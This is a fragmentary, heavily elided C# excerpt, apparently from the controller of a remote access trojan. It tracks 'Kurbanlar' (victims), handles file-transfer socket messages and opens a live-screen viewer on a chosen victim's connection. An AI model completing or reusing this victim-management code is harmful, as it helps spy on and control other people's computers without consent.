                ...
                try
                {
                    switch (s[0])
                    {
                        ...
                        case "DOSYAALINDI":
                            ...
                            FindFileManagerById(soket2.Handle.ToString()).Text = "File Manager";
                        ...
                        case "UZUNLUK":
                            ...
                            try
                            {
                                ...
                                if (fman != null)
                                {
                                    MessageBox.Show(FindFileManagerById(soket2.Handle.ToString()), ex.Message);
                                }
                            }
                            if (fmanger != null)
                            {
                                FindFileManagerById(soket2.Handle.ToString()).timer1.Enabled = false; FindFileManagerById(soket2.Handle.ToString()).count = 0;
                                FindFileManagerById(soket2.Handle.ToString()).Text = "Fime Manager";
            ...
            if (listView1.SelectedItems.Count == 1)
            {
                if (int.Parse(listView1.SelectedItems[0].SubItems[5].Text.Split('/')[1]) >= 21) {
                    foreach (Kurbanlar kurban in kurban_listesi)
                    {
                        if (kurban.id == listView1.SelectedItems[0].Text)
                        {
                            new livescreen(kurban.soket, kurban.id).Show();
                        }
                    }
                }
                else
